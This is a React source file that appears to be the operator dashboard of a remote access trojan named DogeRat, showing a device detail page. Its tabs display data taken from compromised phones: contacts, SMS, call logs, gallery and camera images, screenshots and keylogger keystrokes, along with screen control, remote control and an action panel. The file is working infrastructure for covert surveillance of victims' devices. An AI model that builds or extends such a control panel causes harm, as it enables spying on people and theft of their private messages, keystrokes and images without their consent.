// Device detail component
// Shows detailed information about a specific device with tabs

import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { useRoute } from 'wouter';
import { useQuery } from '@tanstack/react-query';
import { dogeratAPI, Device, DeviceData } from '../../shared/lib/dogerat-api';
import { useDogeRatSocket } from '../../shared/hooks/use-dogerat-socket';
import { DeviceStatusIndicator } from '../../shared/components/devices/device-status-indicator';
import { ActionPanel } from './components/action-panel';
import { ScreenControl } from './components/screen-control';
import { RemoteControl } from './components/remote-control';
import { Button } from '../../shared/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../../shared/components/ui/card';
import { ArrowLeft, Smartphone, Info, MessageSquare, Phone, Image, Camera, FileText, Keyboard } from 'lucide-react';

type TabType = 'overview' | 'contacts' | 'sms' | 'calls' | 'gallery' | 'camera' | 'screenshots' | 'keylogger' | 'actions';

export function DeviceDetail() {
  const [, params] = useRoute('/devices/:id');
  const [, setLocation] = useLocation();
  const [activeTab, setActiveTab] = useState<TabType>('overview');
  const deviceId = params?.id;

  // Fetch device details
  const {
    data: device,
    isLoading,
    error,
    refetch,
  } = useQuery({
    queryKey: ['device', deviceId],
    queryFn: () => dogeratAPI.getDeviceById(deviceId!),
    enabled: !!deviceId,
  });

  // Real-time updates
  useDogeRatSocket({
    onDeviceDataUpdate: (data) => {
      if (data.device_id === deviceId) {
        refetch();
      }
    },
  });

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleString('vi-VN', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });
  };

  const getDeviceDataByType = (type: string): DeviceData[] => {
    if (!device?.device_data) return [];
    return device.device_data.filter((data) => data.data_type === type);
  };

  const tabs: { id: TabType; label: string; icon: any }[] = [
    { id: 'overview', label: 'Overview', icon: Info },
    { id: 'contacts', label: 'Contacts', icon: Smartphone },
    { id: 'sms', label: 'SMS', icon: MessageSquare },
    { id: 'calls', label: 'Calls', icon: Phone },
    { id: 'gallery', label: 'Gallery', icon: Image },
    { id: 'camera', label: 'Camera', icon: Camera },
    { id: 'screenshots', label: 'Screenshots', icon: Image },
    { id: 'keylogger', label: 'Keylogger', icon: Keyboard },
    { id: 'actions', label: 'Actions', icon: FileText },
  ];

  if (isLoading) {
    return (
      <div className="p-6">
        <div className="flex items-center justify-center py-12">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
        </div>
      </div>
    );
  }

  if (error || !device) {
    return (
      <div className="p-6">
        <div className="bg-red-50 border border-red-200 rounded-lg p-4">
          <p className="text-red-800">
            {error instanceof Error ? error.message : 'Device not found'}
          </p>
          <Button onClick={() => setLocation('/devices')} className="mt-2">
            Back to Devices
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6">
      {/* Header */}
      <div className="mb-6">
        <Button
          variant="ghost"
          onClick={() => setLocation('/devices')}
          className="mb-4"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back to Devices
        </Button>

        <div className="flex items-start justify-between">
          <div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">
              {device.model || device.device_id || 'Unknown Device'}
            </h1>
            <p className="text-sm text-gray-600 font-mono">{device.device_id}</p>
          </div>
          <DeviceStatusIndicator
            status={device.status}
            platform={device.platform as 'android' | 'ios'}
          />
        </div>
      </div>

      {/* Tabs */}
      <div className="border-b border-gray-200 mb-6">
        <nav className="flex space-x-8 overflow-x-auto">
          {tabs.map((tab) => {
            const Icon = tab.icon;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`
                  flex items-center gap-2 py-4 px-1 border-b-2 font-medium text-sm
                  ${
                    activeTab === tab.id
                      ? 'border-blue-500 text-blue-600'
                      : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                  }
                `}
              >
                <Icon className="h-4 w-4" />
                {tab.label}
              </button>
            );
          })}
        </nav>
      </div>

      {/* Tab Content */}
      <div>
        {activeTab === 'overview' && (
          <div className="space-y-4">
            {/* Device Information */}
            <Card>
              <CardHeader>
                <CardTitle>Device Information</CardTitle>
                <CardDescription>Basic device details and status</CardDescription>
              </CardHeader>
              <CardContent>
                <dl className="grid grid-cols-2 gap-4">
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Platform</dt>
                    <dd className="mt-1 text-sm text-gray-900">
                      {device.platform?.toUpperCase() || 'N/A'}
                      {device.platform_version && ` ${device.platform_version}`}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Model</dt>
                    <dd className="mt-1 text-sm text-gray-900">{device.model || 'N/A'}</dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Version</dt>
                    <dd className="mt-1 text-sm text-gray-900">{device.version || 'N/A'}</dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">IP Address</dt>
                    <dd className="mt-1 text-sm text-gray-900 font-mono">
                      {device.ip_address || 'N/A'}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Status</dt>
                    <dd className="mt-1 text-sm text-gray-900 capitalize">{device.status}</dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Connected At</dt>
                    <dd className="mt-1 text-sm text-gray-900">
                      {formatDate(device.connected_at)}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Last Seen</dt>
                    <dd className="mt-1 text-sm text-gray-900">
                      {formatDate(device.last_seen)}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-sm font-medium text-gray-600">Device ID</dt>
                    <dd className="mt-1 text-sm text-gray-900 font-mono break-all">
                      {device.device_id}
                    </dd>
                  </div>
                </dl>
              </CardContent>
            </Card>

            {/* Metadata */}
            {device.metadata && Object.keys(device.metadata).length > 0 && (
              <Card>
                <CardHeader>
                  <CardTitle>Metadata</CardTitle>
                </CardHeader>
                <CardContent>
                  <pre className="text-xs bg-gray-50 p-4 rounded overflow-auto">
                    {JSON.stringify(device.metadata, null, 2)}
                  </pre>
                </CardContent>
              </Card>
            )}

            {/* Screen Control */}
            <ScreenControl deviceId={device.id} />

            {/* Remote Control */}
            <RemoteControl deviceId={device.id} />
          </div>
        )}

        {activeTab === 'contacts' && (
          <Card>
            <CardHeader>
              <CardTitle>Contacts</CardTitle>
              <CardDescription>Device contacts data</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('contacts').length > 0 ? (
                <div className="space-y-2">
                  {getDeviceDataByType('contacts').map((data, index) => (
                    <div key={index} className="p-3 bg-gray-50 rounded">
                      <pre className="text-xs overflow-auto">
                        {JSON.stringify(data.data, null, 2)}
                      </pre>
                      <p className="text-xs text-gray-500 mt-1">
                        Captured: {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No contacts data available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'sms' && (
          <Card>
            <CardHeader>
              <CardTitle>SMS Messages</CardTitle>
              <CardDescription>Device SMS data</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('sms').length > 0 ? (
                <div className="space-y-2">
                  {getDeviceDataByType('sms').map((data, index) => (
                    <div key={index} className="p-3 bg-gray-50 rounded">
                      <pre className="text-xs overflow-auto">
                        {JSON.stringify(data.data, null, 2)}
                      </pre>
                      <p className="text-xs text-gray-500 mt-1">
                        Captured: {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No SMS data available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'calls' && (
          <Card>
            <CardHeader>
              <CardTitle>Call History</CardTitle>
              <CardDescription>Device call history data</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('calls').length > 0 ? (
                <div className="space-y-2">
                  {getDeviceDataByType('calls').map((data, index) => (
                    <div key={index} className="p-3 bg-gray-50 rounded">
                      <pre className="text-xs overflow-auto">
                        {JSON.stringify(data.data, null, 2)}
                      </pre>
                      <p className="text-xs text-gray-500 mt-1">
                        Captured: {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No call history available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'gallery' && (
          <Card>
            <CardHeader>
              <CardTitle>Gallery</CardTitle>
              <CardDescription>Device gallery images</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('gallery').length > 0 ? (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {getDeviceDataByType('gallery').map((data, index) => (
                    <div key={index} className="relative">
                      {data.data.url && (
                        <img
                          src={data.data.url}
                          alt={`Gallery ${index + 1}`}
                          className="w-full h-32 object-cover rounded"
                        />
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No gallery images available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'camera' && (
          <Card>
            <CardHeader>
              <CardTitle>Camera Captures</CardTitle>
              <CardDescription>Camera capture data</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('camera').length > 0 ? (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {getDeviceDataByType('camera').map((data, index) => (
                    <div key={index} className="relative">
                      {data.data.url && (
                        <img
                          src={data.data.url}
                          alt={`Camera ${index + 1}`}
                          className="w-full h-32 object-cover rounded"
                        />
                      )}
                      <p className="text-xs text-gray-500 mt-1">
                        {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No camera captures available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'screenshots' && (
          <Card>
            <CardHeader>
              <CardTitle>Screenshots</CardTitle>
              <CardDescription>Device screenshots</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('screenshots').length > 0 ? (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {getDeviceDataByType('screenshots').map((data, index) => (
                    <div key={index} className="relative">
                      {data.data.url && (
                        <img
                          src={data.data.url}
                          alt={`Screenshot ${index + 1}`}
                          className="w-full h-32 object-cover rounded"
                        />
                      )}
                      <p className="text-xs text-gray-500 mt-1">
                        {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No screenshots available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'keylogger' && (
          <Card>
            <CardHeader>
              <CardTitle>Keylogger Data</CardTitle>
              <CardDescription>Captured keystrokes</CardDescription>
            </CardHeader>
            <CardContent>
              {getDeviceDataByType('keylogger').length > 0 ? (
                <div className="space-y-2">
                  {getDeviceDataByType('keylogger').map((data, index) => (
                    <div key={index} className="p-3 bg-gray-50 rounded">
                      <pre className="text-xs overflow-auto">
                        {JSON.stringify(data.data, null, 2)}
                      </pre>
                      <p className="text-xs text-gray-500 mt-1">
                        Captured: {formatDate(data.captured_at)}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-500 text-center py-8">No keylogger data available</p>
              )}
            </CardContent>
          </Card>
        )}

        {activeTab === 'actions' && (
          <ActionPanel deviceId={device.id} platform={device.platform as 'android' | 'ios'} />
        )}
      </div>
    </div>
  );
}
